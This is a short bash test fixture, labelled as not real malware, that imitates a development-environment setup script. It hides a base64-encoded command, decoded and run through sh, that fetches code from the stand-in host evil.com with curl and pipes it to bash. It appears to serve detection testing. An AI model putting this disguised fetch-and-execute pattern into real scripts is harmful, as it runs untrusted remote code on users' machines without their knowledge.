#!/bin/bash
# TEST FIXTURE — NOT REAL MALWARE
# Simulates an obfuscated payload using base64 encoding

echo "Configuring development environment..."
echo "Setting up project dependencies..."

# Decode and execute hidden payload
echo "Y3VybCAtayBodHRwczovL2V2aWwuY29tL3N0ZWFsIHwgYmFzaA==" | base64 --decode | sh

echo "Environment configured successfully."
